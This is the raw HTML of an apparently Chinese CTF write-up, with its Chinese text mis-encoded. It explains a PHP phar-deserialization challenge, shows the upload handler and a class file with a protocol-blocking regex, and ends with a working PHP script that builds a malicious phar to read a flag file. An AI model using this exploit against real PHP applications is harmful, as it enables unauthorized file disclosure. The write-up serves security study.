        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ–‡ä»¶åâ€”â€”ã€‹file_exists()â€”â€”ã€‹æ­£åˆ™è¿‡æ»¤ã€‹è¯»å–ã€‚æ˜¾ç„¶è¿™é‡Œæ²¡æœ‰è¿‡æ»¤pharåè®®ã€‚</p>
<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php"></a>upload_file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>æ–‡ä»¶ä¸Šä¼ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"> 
    <span class="token selector">p</span><span class="token punctuation">&#123;</span> <span class="token property">margin</span><span class="token punctuation">:</span>0 auto<span class="token punctuation">&#125;</span> 
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶å:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç”¨æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸function,phpé…åˆæ¥æ£€æŸ¥æ–‡ä»¶åˆæ³•æ€§ï¼šä¸Šä¼ çš„æ–‡ä»¶ç»è¿‡<code>function.php</code>æ–‡ä»¶ä¸­çš„<code>upload_file()</code>åœ¨æ£€æŸ¥å®Œæ–‡ä»¶ååˆæ³•åç»™ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½å</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æ”¾åœ¨uploadæ–‡ä»¶å¤¹ä¸‹</p>
<h3 id="function-php"><a href="#function-php" class="headerlink" title="function.php"></a>function.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//show_source(__FILE__); </span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span> 
    <span class="token comment">//mkdir("upload",0777); </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("ä¸Šä¼ æˆåŠŸ!");&lt;/script>'</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token comment">//echo "&lt;h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/>"; </span>
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨<code>_show()</code>ç±»ä¸­å¦‚æœè¦è¿›è¡Œæ–‡ä»¶è¯»å–è·å¾—flagæ–‡ä»¶å¯æ˜¯æ–‡ä»¶åä¼šè¢«è¿‡æ»¤ï¼Œå¦æ‰¾æ–¹æ³•ã€‚<br>åœ¨Testç±»ä¸­å­˜åœ¨<code>_get()</code>å‡½æ•°ï¼šå½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™è§¦å‘<code>_get</code>ï¼Œ<code>__get</code>åˆä¼šè§¦å‘getå‡½æ•°ï¼Œgetåˆä¼šè§¦å‘<code>file_get</code>å‡½æ•°æ¥è¯»å–æ–‡ä»¶ï¼Œè€Œ<code>file_get</code>å‡½æ•°å°†æ–‡ä»¶å†…å®¹è¿›è¡Œbase64åŠ å¯†ã€‚<br>é‚£ä¹ˆå°±éœ€è¦æ‰¾ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ¥è§¦å‘<code>__get</code>ã€‚åœ¨<code>Show</code>ç±»ä¸­çš„<code>__tostring()</code>æ–¹æ³•è®©<code>str[&#39;str&#39;]</code>å˜æˆ<code>Test</code>ç±»ï¼Œç„¶åå†è°ƒç”¨sourceå°±ä¼šè§¦å‘ã€‚è¿™é‡Œæ‰¾åˆ°<code>__toString</code>çš„è§¦å‘ç‚¹ï¼Œåœ¨æŠŠä¸€ä¸ªç±»å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™æ‰ä¼šè§¦å‘ï¼Œå¯ä»¥åˆ©ç”¨<code>C1e4r</code>ç±»</p>
<p>æ€»ä½“æ€è·¯ï¼š</p>
<blockquote>
<p>é€šè¿‡<code>C1e4r</code>ï¼Œå°†<code>str</code>èµ‹å€¼ä¸º<code>Show</code>ç±»ï¼Œè§¦å‘<code>__tostring</code>æ–¹æ³•ï¼Œå°†<code>str[&#39;str&#39;]</code>èµ‹å€¼ä¸º<code>Test</code>ç±»è°ƒç”¨<code>source</code>è§¦å‘<code>Test</code>çš„<code>__get()</code>æ–¹æ³•â€“&gt;<code>get</code>â€“&gt;<code>file_get</code>-&gt;<code>flag</code></p>
</blockquote>
<p>popé“¾å­ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">//Testç±»ä¸­æ²¡æœ‰sourceå±æ€§ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªè°ƒç”¨__get()å‡½æ•°</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token comment">//æ•°ç»„ç±»å‹çš„æ•°å€¼</span>
<span class="token punctuation">&#125;</span>


<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é“¾å­ä»¥$aä¸ºèµ·ç‚¹</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
